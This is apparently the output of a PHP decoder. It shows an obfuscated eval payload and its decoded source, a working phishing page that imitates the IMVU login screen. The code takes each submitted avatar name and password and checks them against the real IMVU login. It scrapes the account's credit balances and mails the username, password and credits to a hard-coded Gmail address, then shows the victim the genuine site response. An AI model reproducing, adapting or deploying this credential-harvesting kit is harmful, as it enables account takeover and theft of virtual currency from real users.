Decoder : sohai
Encode type: eval(str_rot13(base64_decode(@file_get_contents(gzinflate(str_rot13(str_rot13(base64_decode('FcRLCoQwDADQ27izadJPkgGZo4i1li4cK1jE4w++xau9n9cHYM2HKelKj1nbD+pZW2/X+JQd4YYe1BBbGQkByUV0bGcW7/lNFYO6GYWCBEHi+TD96VDev61OLq0bFokii1ti1EKZY0qerORNWIe2TSGKt1btkPcJ/w=='))))))));
-------------------
decode output :
-------------------
@set_time_limit(0);
@error_reporting(0);
$user = $_POST["avatarname"];
$pass = $_POST["password"];
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, "https://secure.imvu.com/login/login/");
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
		  	"sauce" => "",
		  	"avatarname" => $user,
		  	"password" => $pass,
		  	"sendto" => "",
		  	));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
		  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
if($_POST["avatarname"] AND $_POST["password"]) {
	if(preg_match("/invalid avatar name or password/", $res)) {
		header("location: imvu.php");
	} else {
        preg_match("/<strong id=\"credits_real_value\"><span class=\"notranslate\">(.*?)<\/span><\/strong>/", $res, $cr);
        preg_match("/<strong id=\"credits_promo_value\"><span class=\"notranslate\">(.*?)<\/span><\/strong>/", $res, $crp);
		$msg = "username: $user\n";
		$msg .= "password: $pass\n";
        $msg .= "Credits: ".$cr[1]."\n";
        $msg .= "promo credits: ".$crp[1]."\n";
		mail("trciksterlicikarus@gmail.com","Korban IMVU wkwkwkwk",$msg);
		echo $res;
	}
} else {
?>
<!DOCTYPE html>
<!--[if IE 8]>         <html dir="ltr" lang="en-US" class="ie8"> <![endif]-->
<!--[if IE 9]>         <html dir="ltr" lang="en-US" class="ie9"> <![endif]-->
<!--[if gt IE 9]><!--> <html dir="ltr" lang="en-US"> <!--<![endif]-->
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <title>Login : IMVU</title>
        
        <script crossorigin="anonymous" src="//webasset-akm.imvu.com/asset/13744e9ab1097b78/build/imvujs/imvu.min.js"></script>

        <script crossorigin="anonymous" src="//webasset-akm.imvu.com/asset/714badb067b83e83/build/ui-core/ui-core-top.min.js"></script>

    <script>
module.setAlias("IMQ", "//webasset-akm.imvu.com/asset/d5e4fa0e99f24209/build/imqjs/imq.min.js");
</script>

    <script>
module.setAlias("UiCore", "//webasset-akm.imvu.com/asset/9a2a4c36e1679d67/build/ui-core/ui-core.min.js");
</script>

    <script>
module.setAlias("Northstar", "//webasset-akm.imvu.com/asset/4648843d76158b0b/build/northstar/js/Northstar.min.js");
</script>

            <link rel="stylesheet" href="//webasset-akm.imvu.com/asset/5a297089330ebbcf/build/css/frontdoor_common.css" media="all" />

    
    <link rel="stylesheet" href="//webasset-akm.imvu.com/asset/f37ecf785f24f736/common/css/frontdoor/login.css" media="all" />


        
    
                          <script>

                  var _gaq = _gaq || [];
                  _gaq.push(["_setAccount", "UA-30366-2"]);
                  _gaq.push(["_setDomainName", ".imvu.com"]);
                  _gaq.push(["_setAllowHash", false]);

                                    _gaq.push(["_trackPageview"]);
                  
                  (function() {
                    var ga = document.createElement("script"); ga.type = "text/javascript"; ga.async = true;
                    ga.src = "https://ssl.google-analytics.com/ga.js";
                    (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(ga);
                  })();

                  </script>
                
</head>
<body class="crowdsource">
<div class="reg-background" style="background-3">
    <div class="reg-centered">
        <div id="header">
            <script>
                var post_time = Date.now() / 1000;
                var url = window.location.href;
                var event = "{"name":"shown","application":"imvu","platform":"default","context":"web.page_load","timestamp":" + post_time + ","sequence_id":1,"attributes":{"url":"" + url + ""}}";
                var data = "{"post_time":" + post_time + ","events":[" + event + "]}";

                $.ajax("https://api.imvu.com/ui_event", {
                    type: "POST",
                    data: data,
                    processData: false,
                    contentType: "application/json; charset=UTF-8",
                    headers: {
                        Accept: "application/json; charset=utf-8"
                    },
                    xhrFields: {
                        withCredentials: true
                    }
                });
            </script>                        <h1><a href="/">&nbsp;</a></h1>
            <p><span class="notranslate">58,279</span> people online now!</p>
            <ul>
               <li class="login"><a href="/catalog/login.php">Member Login</a></li>
                               <li class="home"><a href="/?fd">IMVU Home</a></li>
                           </ul>
                    </div>

                            <script>
                _qoptions={
                    qacct:"p-8fZNjMQsH1Ews"
                };
            </script>
            <script src="https://ssl.quantserve.com/quant.js"></script>
                <script>
        if (typeof _gaq === "object") {
            _gaq.push(["_trackPageview", "/virtual/Login Page Viewed"]);
        }
        </script>
        
        
        
    <script src="/localkey.php"></script>
            

        <div id="content" class="clearafter">
           
<script>
module.run({ main: "//webasset-akm.imvu.com/asset/a56136fab69f326a/unicorns_sections/login/RandomizeBackground.js" }, function (imports) {
    imports.main({"background":"background-3"});
});
</script>





<form method="post" action="<?php $_SERVER["PHP_SELF"]; ?>">
<fieldset class="formsection">
                            <ul>
                        <li><h2>Login using:</h2></li>
            <li id="login_with_carousel"><div class="input text"><div id="gigya_login"></div></div></li>
            <li> <hr /> </li>
                    </ul>
                <ul>
                                                                                <li>
                                                                <h2>Or use your IMVU login:</h2>
                                                <div class="input text  " id="login_field-container">
            <label class="login_field" for="login_field">Avatar / Email</label>

        <input type="text" name="avatarname" id="login_field" value="" tabindex="1" />
    <p class="help"><a href="/catalog/password_forgotten.php">Forgot avatar / email?</a></p>
    
</div>

                        </li>
                                                                            <li><div class="input password  " id="password_field-container">
            <label class="password_field" for="password_field">Password</label>

        <input type="password" name="password" id="password_field" value="" tabindex="1" />
    <p class="help"><a href="/catalog/password_forgotten.php">Forgot password?</a></p>
    
</div>
</li>
            
                        </ul>
            
                        <div class="button submit">
    <button type="submit" tabindex="1" name="submit"><span>Login</span></button>
    </div>

            
                                        <p class="notmember">Not a member? <a href="http://www.imvu.com/signup/" id="signup">Sign up</a>.</p>
                                </fieldset>
</form>


<script>
    $("#login_field").focus();
</script>

    <div class="mrec">
        <p>Advertisement</p>
                <!-- begin ad tag (tile=3) -->
        <iframe src="https://ad.doubleclick.net/adi/imvu.web/login;age=17;g=f;tile=3;sz=300x250;dc_ref=https%3A%2F%2Fsecure.imvu.com%2Flogin%2Flogin%2F;google_page_url=https%3A%2F%2Fsecure.imvu.com%2Flogin%2Flogin%2F;ord=249698752" frameborder="0" scrolling="no" width="300" height="250"></iframe>
        <!-- end ad tag -->
    </div>

    <span id="gigya_login_script">
<link rel="stylesheet" href="//webasset-akm.imvu.com/asset/15234af73bd9cb65/common/css/gigya/gigya_carousel_style.css" media="all" />

<script src="https://cdns.gigya.com/JS/socialize.js?apikey=2__M9YjGltLWXjyKXllhcTuc9sC4NxFvhTd5Ycxin41VowsISvavKq8HvbHnAzX6qX"></script>

<script src="//webasset-akm.imvu.com/asset/6ecdf9f20ad76f98/common/js/gigya/gigya_carousel.js"></script>

<script>
$(document).ready(function () {
    conf = {"APIKey":"2__M9YjGltLWXjyKXllhcTuc9sC4NxFvhTd5Ycxin41VowsISvavKq8HvbHnAzX6qX","signIDs":true,"newUsersPendingRegistration":true,"enabledProvidersArray":["facebook","twitter","google","yahoo","linkedin"]};
    SocialScroller($("#gigya_login"), conf);
});
</script>
</span>
<iframe class="SL_norewrite" src="https://secure.imvu.com/pixel_iframe.php?location=login_page" id="pixel" width="1" height="1" frameborder="0" style="position:absolute;top:0;left:0;pointer-events:none;visiblity:hidden;"></iframe>
    

        </div>

                  <div id="footer">
              <ul class="links-line">
    <li class="footer-el"><a class="link" href="/mobile/">Mobile</a></li>
    <li class="footer-el"><a class="link" href="/people/">People</a></li>
    <li class="footer-el"><a class="link" href="/groups/">Groups</a></li>
    <li class="footer-el"><a class="link" href="/forums/">Forums</a></li>
    <li class="footer-el"><a class="link" href="/rooms/">3D Chat Rooms</a></li>
    <li class="footer-el"><a class="link" href="/shop/">3D Virtual Catalog</a></li>
    <li class="footer-el"><a class="link" href="/store/">Buy Credits</a></li>
    <li class="footer-el"><a class="link" href="/earn/index/">Earn Credits</a></li>
    <li class="footer-el"><a class="link" href="/creators/">Creator Center</a></li>
    <li class="footer-el"><a class="link" href="/signup/download/">Download</a></li>
</ul>
<ul class="links-line">
    <li class="footer-el"><a class="link" href="/about/">About Us</a></li>
    <li class="footer-el"><a class="link" href="/policy_hub/policy_hub.php">Policies</a></li>
    <li class="footer-el"><a class="link" href="http://blog.imvu.com/">Blog</a></li>
    <li class="footer-el"><a class="link" href="/catalog/web_info.php?section=Info&amp;topic=contactus">Contact Us</a></li>
    <li class="footer-el"><a class="link" href="/about/IMVU_MediaKit_2014.pdf">Advertise</a></li>
    <li class="footer-el"><a class="link" href="/jobs/">Jobs</a></li>
    <li class="footer-el"><a class="link" href="/catalog/web_safety_tips01.php">Safety</a></li>
    <li class="footer-el"><a class="link" href="/avatar/">Avatar</a></li>
    <li class="footer-el"><a class="link" href="/catalog/web_help_center.php">Help</a></li>
</ul>

<p class="copyright">&copy; 2015 IMVU All rights reserved</p>
          </div>
        
                        
        
                        <script crossorigin="anonymous" src="//webasset-akm.imvu.com/asset/f4ecdd2a2685ef7f/common/js/modal.js"></script>

        

        
                                </div>
</div>
</body>
</html>
<?php }